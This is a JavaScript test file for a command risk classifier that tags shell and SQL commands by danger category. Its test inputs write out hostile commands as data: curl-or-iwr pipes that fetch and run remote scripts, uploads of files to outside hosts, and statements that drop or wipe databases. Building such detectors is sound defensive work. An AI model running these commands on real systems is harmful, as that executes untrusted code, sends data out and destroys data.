import test from 'node:test';
import assert from 'node:assert/strict';

import { CommandRiskClassifier } from '../src/security/command-risk-classifier.mjs';

const classifier = new CommandRiskClassifier();
const categories = (input) => classifier.classify(input).categories;

test('classifies system, permission, administrator, firewall, and service control commands from argv tokens', () => {
  assert.deepEqual(categories({ command: 'shutdown', args: ['-h', 'now'] }), ['system-change']);
  assert.deepEqual(categories({ command: 'chmod', args: ['777', 'file'] }), ['permission-change']);
  assert.deepEqual(categories({ command: 'sudo', args: ['apt-get', 'install', 'x'] }), ['administrator']);
  assert.deepEqual(categories({ command: 'ufw', args: ['allow', '8080'] }), ['firewall-change']);
  assert.deepEqual(categories({ command: 'systemctl', args: ['start', 'nginx'] }), ['service-start']);
  assert.deepEqual(categories({ command: 'systemctl', args: ['stop', 'nginx'] }), ['service-stop']);
  assert.deepEqual(categories({ command: 'sc.exe', args: ['start', 'Spooler'] }), ['service-start']);
  assert.deepEqual(categories({ command: 'powershell.exe', args: ['-Command', 'Stop-Service Spooler'] }), ['service-stop']);
});

test('classifies download-and-execute and outbound transfer patterns without rendering a shell command', () => {
  assert.deepEqual(categories({ command: 'bash', args: ['-c', 'curl https://example.test/a.sh | sh'] }), ['download-and-execute']);
  assert.deepEqual(categories({ command: 'powershell.exe', args: ['-Command', 'iwr https://example.test/a.ps1 | iex'] }), ['download-and-execute']);
  assert.deepEqual(categories({ command: 'curl', args: ['--upload-file', 'report.txt', 'https://upload.test/inbox'] }), ['outbound-transfer']);
  assert.deepEqual(categories({ command: 'scp', args: ['report.txt', 'user@example.test:/tmp/'] }), ['outbound-transfer']);
});

test('classifies dangerous SQL and leaves bounded read-only SQL unclassified', () => {
  assert.deepEqual(categories({ command: 'psql', args: ['-c', 'DROP DATABASE production'] }), ['dangerous-sql']);
  assert.deepEqual(categories({ command: 'sqlite3', args: ['db.sqlite'], stdin: 'DELETE FROM users;' }), ['dangerous-sql']);
  assert.deepEqual(categories({ command: 'mysql', args: ['-e', 'UPDATE users SET admin=1'] }), ['dangerous-sql']);
  assert.deepEqual(categories({ command: 'psql', args: ['-c', 'SELECT id FROM users WHERE id = 1'] }), []);
  assert.deepEqual(categories({ command: 'psql', args: ['-c', 'DELETE FROM users WHERE id = 1'] }), []);
});

test('maps categories to exact capabilities without duplicates', () => {
  const result = classifier.classify({ command: 'bash', args: ['-c', 'curl https://example.test/a.sh | sh'] });
  assert.deepEqual(result.requiredCapabilities, ['network.use', 'software.install']);
  const upload = classifier.classify({ command: 'curl', args: ['-T', 'file', 'https://example.test'] });
  assert.deepEqual(upload.requiredCapabilities, ['file.upload', 'network.use']);
});
